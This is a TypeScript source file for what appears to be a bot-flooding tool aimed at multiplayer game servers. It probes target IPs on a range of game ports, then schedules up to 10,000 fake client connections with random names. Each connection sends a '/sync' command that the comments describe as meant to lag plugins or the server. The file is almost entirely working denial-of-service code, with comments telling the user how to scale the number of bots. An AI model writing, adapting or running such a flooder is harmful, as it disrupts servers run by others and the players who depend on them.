import {Log, LogLevel, SuperLogHandler} from './ultimate-logger';
import PacketHandler from "./packets/packet-handler";
import MessagePacket from "./packets/message-packet";
import MessagePacket2 from "./packets/message-packet2";
import ChatEntity from "./chat-entity";
import StreamBegin from "./packets/stream-begin";
import StreamChunk from "./packets/stream-chunk";

Log.level = LogLevel.debug;
Log.logger = new SuperLogHandler();

PacketHandler.instance.on(70, (packet: MessagePacket) => Log.info("SMP1|>|", packet));
PacketHandler.instance.on(71, (packet: MessagePacket2) => Log.info("SMP2|>|", packet));
//PacketHandler.instance.on(2, (packet: WorldData) => Log.info("WD|>|", packet));

PacketHandler.instance.on(0, (packet: StreamBegin) => {
    Log.info("STREAM BEGIN|<" + packet.pid + ">|", packet.type, packet.total);
    PacketHandler.instance.runChunks(packet)
});

PacketHandler.instance.on(1, (packet: StreamChunk) => {
    Log.info("STREAM CHUNK|<" + packet.pid + ">|", PacketHandler.instance.pushChunk(packet));
});

const ports = ['6567', '6568', '6569', '6570', '6571', '6572', '6573', '6574']; //bot will try to enter most common ports
let ips = process.argv.slice(2); //bot will try to enter most common ips
if (ips.length == 0) {
    ips = ['localhost'];
}
const validIP = {};
ips.forEach(ip => {
   validIP[ip] = [];
   for (const port of ports) {
       try {
           const en = new ChatEntity(ip, parseInt(port), "VOID", false);
           en.sendMessage("/sync"); //specific command to lag plugins/server
           //good ip
           validIP[ip].push(port);
       } catch (e) {
           console.log(e);
       }
   }

});

for (let i = 0; i < 10000; i++) { //change this to how many bots you want to spawn
    setTimeout(() => {
        let conip = String(ips[(Math.random() * ips.length) | 0])
        if (!validIP[conip] || validIP[conip].length == 0) {
            //TODO delete from conip
            
            return;
        }
        let name = String(Math.floor(Math.random() * 1000))
        let port = parseInt(validIP[conip][(Math.random() * validIP[conip].length) | 0]);
        try {
            const en = new ChatEntity(conip, port, name, false);
            en.sendMessage("/sync"); //specific command to lag plugins/server
        } catch (e) {
            //check if refused
            validIP[conip].splice(validIP[conip].indexOf(port), 1);
            console.log(e);
        }
    }, 300);//WARNING MIGHT CRASH YOUR PC/VPS
}

process.on('uncaughtException', function (exception) {
    console.log(exception);
    return;
});
//setTimeout(() => en.sendMessage("/sync"), 3000)
//setTimeout(() => {
//    while (true) en.sendRuntime()
//}, 2000);
